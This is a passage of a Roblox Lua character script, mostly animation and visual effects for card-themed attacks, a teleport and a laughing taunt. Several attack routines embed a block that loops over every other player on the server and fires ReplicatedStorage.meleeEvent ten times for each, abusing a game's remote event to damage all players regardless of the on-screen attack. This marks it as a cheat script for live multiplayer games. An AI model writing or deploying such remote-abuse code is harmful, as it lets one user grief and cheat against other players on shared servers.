RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
end
end
end)()
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
for i = 1, 15 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,1.5,-.1),.5)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,0,0) * CFrame.Angles(math.rad(180),math.rad(10),math.rad(10)),.3)
swait()
end
cardportal = Instance.new("Part", Torso)
cardportal.Size = Vector3.new(0.5, 0.5, 0.5)
cardportal.Material = "Neon"
cardportal.BrickColor = BrickColor.new("White")
cardportal.Transparency = 0
cardportal.Anchored = true
cardportal.CanCollide = false
cardportalMESH = Instance.new("SpecialMesh", cardportal)
cardportalMESH.MeshType = "Cylinder"
cardportalMESH.Scale = Vector3.new(.2,0.01,0.01)
cardportal.CFrame = CFrame.new(mouse.Hit.p) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(90))
for i = 1, 10 do
cardportalMESH.Scale = cardportalMESH.Scale + Vector3.new(0,4,4)
swait()
end
bigzcard = Instance.new("Part",Torso)
bigzcard.Material = "Neon"
bigzcard.Transparency = 0
bigzcard.BrickColor = BrickColor.new("White")
bigzcard.Size = Vector3.new(10, 15, 0.3)
bigzcard.CFrame = cardportal.CFrame * CFrame.new(-8,0,0) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(90))
bigzcard.Anchored = true
SOUND(bigzcard,1888686669,6,false,1)
acer = Instance.new("Decal",bigzcard)
acer.Texture = "rbxassetid://1881287656"
acer.Transparency = 0
acer.Face = "Front"
ace2 = acer:Clone()
ace2.Parent = bigzcard
ace2.Face = "Back"
spinning = true
coroutine.wrap(function()
while spinning do
bigzcard.CFrame = bigzcard.CFrame * CFrame.Angles(0,math.rad(0+5),0)
swait()
end
end)()
for i = 1, 20 do
bigzcard.CFrame = bigzcard.CFrame * CFrame.new(0,-.9,0)
swait()
end
coroutine.wrap(function()
for i = 1, 10 do
cardportalMESH.Scale = cardportalMESH.Scale - Vector3.new(0,4,4)
swait()
end
cardportal:Remove()
end)()
wait(.7)
ace3 = Instance.new("Decal",bigzcard)
ace3.Texture = "rbxassetid://1880203893"
ace3.Transparency = 1
ace3.Face = "Front"
ace4 = ace3:Clone()
ace4.Parent = bigzcard
ace4.Face = "Back"
bigzcard2 = Instance.new("Part",Torso)
bigzcard2.Material = "Neon"
bigzcard2.Transparency = 1
bigzcard2.BrickColor = BrickColor.new("Really black")
bigzcard2.Size = Vector3.new(10, 15, 0.29)
bigzcard2.CFrame = bigzcard.CFrame
bigzcard2.CanCollide = false
bigzcard2.Anchored = true
coroutine.wrap(function()
while spinning do
bigzcard2.CFrame = bigzcard2.CFrame * CFrame.Angles(0,math.rad(0+5),0)
swait()
end
end)()
blz = bl[math.random(1,#bl)]
woos = Instance.new("Sound",Torso)
woos.SoundId = "rbxassetid://"..blz
woos.Volume = 4
woos:Play()
for i = 1, 20 do
bigzcard2.Transparency = bigzcard2.Transparency - .05
bigzcard.Transparency = bigzcard.Transparency + .05
ace3.Transparency = ace3.Transparency - 0.05
ace4.Transparency = ace4.Transparency - 0.05
acer.Transparency = acer.Transparency + 0.05
ace2.Transparency = ace2.Transparency + 0.05
wait()
end
ace3.Parent = bigzcard2
ace3.Face = "Front"
ace4.Parent = bigzcard2
ace4.Face = "Back"
bigzcard:Remove()
spinning = false
blackholeactive = true
coroutine.wrap(function()
blackhole={}
orbzfade={}
for i = 1, 100 do
orbz = Instance.new("Part", Torso)
orbz.Shape = "Ball"
orbz.Material = "Neon"
orbz.BrickColor = BrickColor.new("Really black")
orbz.Size = Vector3.new(2,2,2)
orbz.Anchored = true
orbz.CanCollide = false
removeuseless:AddItem(orbz,1)
orbz.CFrame = bigzcard2.CFrame * CFrame.new(math.random(-25,25),math.random(-25,25),math.random(-25,25)) * CFrame.Angles(math.rad(-180,180),math.rad(-180,180),math.rad(-180,180))
table.insert(blackhole,orbz)
table.insert(orbzfade,orbz)
for i,v in pairs(blackhole) do
v.CFrame = v.CFrame:lerp(CFrame.new(bigzcard2.Position),.05)
end
for i,v in pairs(orbzfade) do
v.Transparency = v.Transparency + 0.025
end
swait()
end
end)()
coroutine.wrap(function()
while blackholeactive do
local Hit = damagealll(45,bigzcard2.Position)		
for _,v in pairs(Hit) do
coroutine.wrap(function()
wait(.15)
if blackholeactive == false then return end
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
end)()		
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
torso.CFrame = torso.CFrame:lerp(CFrame.new(bigzcard2.Position),.1)
end
wait()
end
end)()
for i = 1, 100 do
bigzcard2.CFrame = bigzcard2.CFrame * CFrame.Angles(0,math.rad(0+20),0)
cataclysmics = Instance.new("Part", Torso)
cataclysmics.Shape = "Ball"
cataclysmics.Material = "Neon"
cataclysmics.BrickColor = BrickColor.new("Really black")
cataclysmics.Size = Vector3.new(11,11,11)
cataclysmics.Transparency = .3
cataclysmics.Anchored = true
cataclysmics.CanCollide = false
cataclysmics.CFrame = CFrame.new(bigzcard2.Position)
table.insert(LessSize,cataclysmics)
table.insert(keyYtransparency,cataclysmics)
removeuseless:AddItem(cataclysmics,1)
swait()
end
coroutine.wrap(function()
for i = 1, 20 do
for i,v in pairs(orbzfade) do
v.Transparency = v.Transparency + 0.05
end
swait()
end
end)()
explosiontable={}
ringtable={}
ringtable2={}
soundboks = Instance.new("Part",Torso)
soundboks.CanCollide = false
soundboks.Anchored = true
soundboks.Transparency = 1
soundboks.CFrame = bigzcard2.CFrame
removeuseless:AddItem(soundboks,6)
SOUND(soundboks,472579737,6,false,1)
blackholeactive = false
bigzcard2:Remove()
Hit = damagealll(60,soundboks.Position)
for _,v in pairs(Hit) do			
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(soundboks.Position,torso.Position).lookVector*200
removeuseless:AddItem(vel,.1)
end
coroutine.wrap(function()
shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = 0
shockwave.BrickColor = BrickColor.new("Really black")
shockwave.CFrame = CFrame.new(soundboks.Position) * CFrame.new(0,-6,0)
shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(5,2,5)
shockwavemesh.MeshId = "rbxassetid://20329976"
shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = 0
shockwave2.BrickColor = BrickColor.new("Really black")
shockwave2.CFrame = CFrame.new(soundboks.Position) * CFrame.new(0,-6,0)
shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(5,2,5)
shockwavemesh2.MeshId = "rbxassetid://20329976"
for i = 1, 40 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+15),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+8),0)
shockwave.Transparency = shockwave.Transparency + 0.025
shockwave2.Transparency = shockwave2.Transparency + 0.025
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(9,.9,9)
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(8,.8,8)
swait()
end
shockwave:Remove()
shockwave2:Remove()
end)()	
for i = 1, 4 do
explosion = Instance.new("Part", Torso)
explosion.Shape = "Ball"
explosion.Size = Vector3.new(1,1,1)
explosion.Transparency = 0
explosion.CanCollide = false
explosion.Anchored = true
explosion.BrickColor = BrickColor.new("Really black")
explosion.Material = "Neon"
explosion.CFrame = CFrame.new(bigzcard2.Position)
table.insert(ExtremeM,explosion)
table.insert(SlowlyFade,explosion)
removeuseless:AddItem(explosion,4)
ring = Instance.new("Part", Torso)
ring.Size = Vector3.new(5, 5, 5)
ring.Transparency = 0
ring.BrickColor = BrickColor.new("Really black")
ring.Anchored = true
ring.CanCollide = false
ring.CFrame = bigzcard2.CFrame * CFrame.Angles(math.rad(math.random(-180,180)), math.rad(math.random(-180,180)), math.rad(math.random(-180,180)))
ringh = Instance.new("SpecialMesh", ring) 
ringh.MeshId = "http://www.roblox.com/asset/?id=3270017" 
ringh.Scale = Vector3.new(2, 2, .1)
table.insert(keyYsize,ringh)
table.insert(keyYtransparency,ring)
removeuseless:AddItem(ring,4)
swait()
end
wait(1.2)
clean()
keyYsize={}
keyYtransparency={}
blackholev = false
appi = false
g1:Remove()
ws = 10
attacking = false
debounce = false
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='t' then
if levitate then
if tauntdebounce then return end
tauntdebounce = true
laughing = true
coroutine.wrap(function()
while laughing do
local b1 = Instance.new("BillboardGui",Head)
b1.Size = UDim2.new(0,4,0,1.6)
b1.StudsOffset = Vector3.new(0,0,0)
b1.Name = "laff"
b1.AlwaysOnTop = true
b1.Adornee = Head
removeuseless:AddItem(b1,3)
local b2 = Instance.new("TextLabel",b1)
b2.BackgroundTransparency = 1
b2.Text = "HaHaHaHaHaHa..."
b2.Font = "Garamond"
b2.TextSize = 0
b2.Name = "lafftext"
b2.TextStrokeTransparency = 0
b2.TextColor3 = BrickColor.new("Really red").Color
b2.TextStrokeColor3 = Color3.new(0,0,0)
b2.Size = UDim2.new(1,0,.5,0)
table.insert(laughingtable,b2)
removeuseless:AddItem(b1,2)
coroutine.wrap(function()
if zxc then return end
zxc = true
while true do
swait()
for i,v in pairs(Head:GetChildren()) do
if v.Name == "laff" then
v.StudsOffset = v.StudsOffset + Vector3.new(math.random(-2,2),.3,math.random(-2,2))
end
end
for i,v in pairs(laughingtable) do
v.TextTransparency = v.TextTransparency + .025
v.TextStrokeTransparency = v.TextStrokeTransparency + 0.25
v.TextSize = v.TextSize + 2
v.Rotation = v.Rotation + .1
end
end
end)()
swait(10)
end
end)()
laugh = laughs[math.random(1,#laughs)]
laughy = Instance.new("Sound",Head)
laughy.SoundId = "rbxassetid://"..laugh
laughy.Volume = 10
laughy:Play()
wait(1)
wait(laughy.TimeLength)
laughing = false
laughy:Remove()
tauntdebounce = false
else
if mouse.Target ~= nil then
if debounce then return end
attacking = true
ghost()
tps = Instance.new("Sound", Torso)
tps.Volume = 5
tps.SoundId = "rbxassetid://1894958339"
tps:Play()
removeuseless:AddItem(tps,2)
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
g1.CFrame = CFrame.new(Root.Position,mouse.Hit.p)
removeuseless:AddItem(g1,.05)
Root.CFrame = CFrame.new(mouse.Hit.p) * CFrame.new(0,3.3,0)
wait(.1)
attacking = false
debounce = false
end
end
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='q' then
if levitate then return end
if mouse.Target ~= nil and mouse.Target.Parent ~= Character and mouse.Target.Parent.Parent ~= Character and mouse.Target.Parent:FindFirstChildOfClass("Humanoid") ~= nil and mouse.Target.Parent:FindFirstChildOfClass("Humanoid").Health ~= 0 then
if debounce then return end
debounce = true
attacking = true
appi = true
ws = 0
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.y > 1 and attacking == true then
position = "Jump2"
elseif Root.Velocity.y < -1 and attacking == true then
position = "Falling2"
elseif Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
elseif Root.Velocity.Magnitude > 2 and attacking == true then
position = "Walking2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Jump2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(10), math.rad(0), math.rad(0)), 0.4)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(20), math.rad(0), math.rad(0)), 0.4)
elseif position == "Falling2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 2, 0) * CFrame.Angles(math.rad(8), math.rad(4), math.rad(0)), 0.2)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.0, .9) * CFrame.Angles(math.rad(14), math.rad(-4), math.rad(0)), 0.2)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.6, 0.5, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-20)), 0.2)
elseif position == "Idle2" and attacking == true and appi == true then
change = .4
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.3, 2, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(-10)), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.3, 2.0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(10)), 0.3)
elseif position == "Walking2" and attacking == true and appi == true then
change = .8
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.5,.6,-.5) * CFrame.Angles(math.rad(32),math.rad(5 - 1 * math.sin(sine/12)),math.rad(40 - 2 * math.sin(sine/12))), 0.3)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(-.2,1.2,-.3),.3)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,math.rad(0) + Root.RotVelocity.Y/30,math.cos(25*math.cos(sine/8))),.3)
RIGHTLEGLERP.C0 = RIGHTLEGLERP.C0:lerp(CFrame.new(-0.5, 1.92 - 0.35 * math.cos(sine/8)/2.8, 0.2 - math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) + -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + RightLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
LEFTLEGLERP.C0 = LEFTLEGLERP.C0:lerp(CFrame.new(0.5, 1.92 + 0.35 * math.cos(sine/8)/2.8, 0.2 + math.sin(sine/8)/3.4) * CFrame.Angles(math.rad(10) - -math.sin(sine/8)/2.3, math.rad(0)*math.cos(sine/1), math.rad(0)  + LeftLeg.RotVelocity.Y / 30, math.cos(25 * math.cos(sine/8))), 0.3)
end
end
end)()
enemyhum = mouse.Target.Parent:FindFirstChildOfClass("Humanoid")
ETorso = enemyhum.Parent:FindFirstChild("Torso") or enemyhum.Parent:FindFirstChild("LowerTorso")
EHead = enemyhum.Parent:FindFirstChild("Head")
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
brick = Instance.new("Part",Torso)
brick.Anchored = true
brick.CanCollide = false
brick.Material = "Neon"
brick.Transparency = 1
brick.BrickColor = BrickColor.new("White")
brick.Size = Vector3.new(8,.3,12)
brick.CFrame = Root.CFrame * CFrame.new(math.random(-15,15),-3,math.random(-15,15))
SOUND(brick,1888686669,6,false,1.5)
ace = aces[math.random(1,#aces)]
acer = Instance.new("Decal",brick)
acer.Texture = "rbxassetid://1898092341"
acer.Transparency = 1
acer.Face = "Top"
coroutine.wrap(function()
for i = 1, 20 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
brick.Transparency = brick.Transparency - .05
acer.Transparency = acer.Transparency - .1
swait()
end
end)()
ETorso.Anchored = true
EHead.Anchored = true
for i = 1, 25 do
swait()
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,-.2,0) * CFrame.Angles(0,0,0),.3)
LEFTARMLERP.C1 = CFrame.new(0,0,0) * CFrame.Angles(0,0,0)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
brick.CFrame = brick.CFrame:lerp(CFrame.new(ETorso.Position) * CFrame.new(0,-3,0) * CFrame.Angles(0,math.rad(0+10),0),.2)
end
SOUND(brick,472214107,6,false,2)
coroutine.wrap(function()
for i = 1, 10 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,ETorso.Position),.2)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, .8, 0.4) * CFrame.Angles(math.rad(-60 - 2 * math.sin(sine/12)), math.rad(3), math.rad(4)), 0.3)
swait()
end
end)()
shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = 0
shockwave.BrickColor = BrickColor.new("White")
shockwave.CFrame = CFrame.new(brick.Position)
shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(1,1,1)
shockwavemesh.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave,4)
shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = 0
shockwave2.BrickColor = BrickColor.new("White")
shockwave2.CFrame = CFrame.new(brick.Position)
shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(1,1,1)
shockwavemesh2.MeshId = "rbxassetid://20329976"
removeuseless:AddItem(shockwave2,4)
for i = 1, 35 do
swait()
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(2,.1,2)
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(0,math.rad(0+12),0)
shockwave.Transparency = shockwave.Transparency + .05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(.5,.1,.5)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(0,math.rad(0+4),0)
shockwave2.Transparency = shockwave2.Transparency + .03
EHead.CFrame = EHead.CFrame * CFrame.new(0,-.20,0)
ETorso.CFrame = ETorso.CFrame * CFrame.new(0,-.25,0)
end
for i = 1, 8 do
brick.Size = brick.Size + Vector3.new(1.5,0,2.5)
swait()
end
n = 0
SOUND(brick,54111471,6,false,1)
for i = 1, 40 do
n = n + 6
brick.Transparency = brick.Transparency + .025
acer.Transparency = acer.Transparency + .075
brick.CFrame = brick.CFrame * CFrame.Angles(0,math.rad(n),0)
brick.Size = brick.Size - Vector3.new(1.5,.025,2.5)
swait()
end
ws = 10
brick:Remove()
enemyhum.Parent:Remove()
attacking = false
removeuseless:AddItem(g1,0.001)
debounce = false
appi = false
end
end
end)

mouse.KeyDown:connect(function(Press)
Press=Press:lower()
if Press=='p' then
if levitate then return end
if blocking then
if blockedoff then return end
clickallowance = false
appi = false
attacking = true
blocking = false
throwing = true
ws = 0
n = 0
blockcard.CanCollide = false
for i = 1, 35 do
n = n + 20
blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5) * CFrame.Angles(0,math.rad(n),0)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(25), math.rad(0)), 0.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-50 - 2 * math.sin(sine/12)), math.rad(12), math.rad(9)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(-.65, .6, 1) * CFrame.Angles(0,0,0),.3)
swait()
end
blockcard.CFrame = Root.CFrame * CFrame.new(0,3,-5 + -1) * CFrame.Angles(0,0,0)
blockcard.CanCollide = false
locater1 = Instance.new("Part",blockcard)
locater1.Size = Vector3.new(1,1,1)
locater1.CanCollide = false
locater1.Anchored = true
locater1.Transparency = 1
locater2 = Instance.new("Part",blockcard)
locater2.Size = Vector3.new(1,1,1)
locater2.CanCollide = false
locater2.Transparency = 1
locater2.Anchored = true
locater3 = Instance.new("Part",blockcard)
locater3.Size = Vector3.new(1,1,1)
locater3.Transparency = 1
locater3.CFrame = blockcard.CFrame * CFrame.Angles(math.rad(90),0,0)
locater3.CanCollide = false
locater3.Anchored = true
fushfush = Instance.new("Sound",blockcard)
fushfush.SoundId = "rbxassetid://288641686"
fushfush.Volume = 8
fushfush:Play()
boosh:Play()
coroutine.wrap(function()
n = 0
for i = 1, 35 do
n = n + 10
shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .5
shockwave.BrickColor = BrickColor.new("White")
shockwave.CFrame = locater3.CFrame
shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(15,.7,15)
shockwavemesh.MeshId = "rbxassetid://20329976"
shockwave.CFrame = locater3.CFrame * CFrame.Angles(math.rad(0),math.rad(1),0)
removeuseless:AddItem(shockwave,1)
table.insert(lolzor2,shockwave)
for i,v in pairs(lolzor2) do
v.Transparency = v.Transparency + .1
v.CFrame = v.CFrame * CFrame.Angles(math.rad(0),math.rad(n),0)
end
swait()
end
end)()
for i = 1, 35 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, -.2, 0) * CFrame.Angles(math.rad(0), math.rad(-20), math.rad(0)), 0.3)
LEFTARMLERP.C1 = LEFTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.3)
LEFTARMLERP.C0 = LEFTARMLERP.C0:lerp(CFrame.new(1, 1.35, 0.4) * CFrame.Angles(math.rad(-90 - 2 * math.sin(sine/12)), math.rad(-20), math.rad(4)), 0.3)
fushfush.Volume = fushfush.Volume - .2
Hit = damagealll(20,blockcard.Position)
for _,v in pairs(Hit) do			
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
vel = Instance.new("BodyVelocity",v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")) 
vel.maxForce = Vector3.new(9999999999999,9999999999999,9999999999999)
torso = v:FindFirstChild("Torso") or v:FindFirstChild("UpperTorso")
vel.velocity = CFrame.new(blockcard.Position,torso.Position).lookVector*120
removeuseless:AddItem(vel,.1)
end
locater1.CFrame = blockcard.CFrame * CFrame.new(-5,-6,0)
locater3.CFrame = blockcard.CFrame * CFrame.new(0,0,-1) * CFrame.Angles(math.rad(90),0,0)
locater2.CFrame = blockcard.CFrame * CFrame.new(5,-6,0)
grassblocks = Instance.new("Part",Torso)
grassblocks.Size = Vector3.new(4,4,4)
grassblocks.Material = "Grass"
grassblocks.Anchored = true
grassblocks.BrickColor = BrickColor.new("Bright green")
grassblocks.CFrame = locater1.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(grassblocks,5)
grassblocks2 = Instance.new("Part",Torso)
grassblocks2.Size = Vector3.new(4,4,4)
grassblocks2.Material = "Grass"
grassblocks2.Anchored = true
grassblocks2.BrickColor = BrickColor.new("Bright green")
grassblocks2.CFrame = locater2.CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
removeuseless:AddItem(grassblocks2,5)
blockcardshadow = Instance.new("Part",Torso)
blockcardshadow.Transparency = .5
blockcardshadow.Anchored = true
blockcardshadow.Material = "Neon"
blockcardshadow.BrickColor = BrickColor.new("White")
blockcardshadow.Size = Vector3.new(8, 13, 0.3)
blockcardshadow.CanCollide = false
blockcardshadow.CFrame = blockcard.CFrame
removeuseless:AddItem(blockcardshadow,2)
table.insert(lolzor,blockcardshadow)
for i,v in pairs(lolzor) do
v.Transparency = v.Transparency + 0.05
end
blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,-4)
swait()
end
blockcard.Name = "Getthisshitoutofhere"
for i = 1, 10 do
blockcard.CFrame = blockcard.CFrame * CFrame.new(0,0,-2)
blockcard.Transparency = blockcard.Transparency + .1
acer.Transparency = blockcard.Transparency
ace2.Transparency = blockcard.Transparency
for i,v in pairs(lolzor) do
v.Transparency = v.Transparency + .05
end
for i,v in pairs(lolzor2) do
v.Transparency = v.Transparency + .1
end
swait()
end
lolzor={}
lolzor2={}
attacking = false
debounce = false
blocking = false
throwing = false
fushfush:Remove()
clickallowance = false
appi = false
blockcard:Remove()
g1:Remove()
ws = 10
else
if debounce then return end
if throwing then return end
debounce = true
ws = 10
attacking = true
blocking = true
boosh = Instance.new("Sound",nil)
boosh.SoundId = "rbxassetid://413682983"
boosh.Volume = 6
appi = true
coroutine.wrap(function()
while appi do
wait()
if Root.Velocity.y > 1 and attacking == true then
position = "Jump2"
elseif Root.Velocity.y < -1 and attacking == true then
position = "Falling2"
elseif Root.Velocity.Magnitude < 2 and attacking == true then
position = "Idle2"
elseif Root.Velocity.Magnitude > 2 and attacking == true then
position = "Walking2"
end
end
end)()
coroutine.wrap(function()
while appi do
wait()
settime = 0.05
sine = sine + change
if position == "Jump2" and attacking == true and appi == true then
change = 1
LEFTLEGLERP.C1 = LEFTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.1)
RIGHTLEGLERP.C1 = RIGHTLEGLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),0,0),.1)
RIGHTARMLERP.C1 = RIGHTARMLERP.C1:lerp(CFrame.new(0,0,0) * CFrame.Angles(0,0,0),.4)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), 0.4)
RIGHTARMLERP.C0 = RIGHTARMLERP.C0:lerp(CFrame.new(-1.4,.1,-.2) * CFrame.Angles(math.rad(20),math.rad(3),math.rad(4)), 0.4)
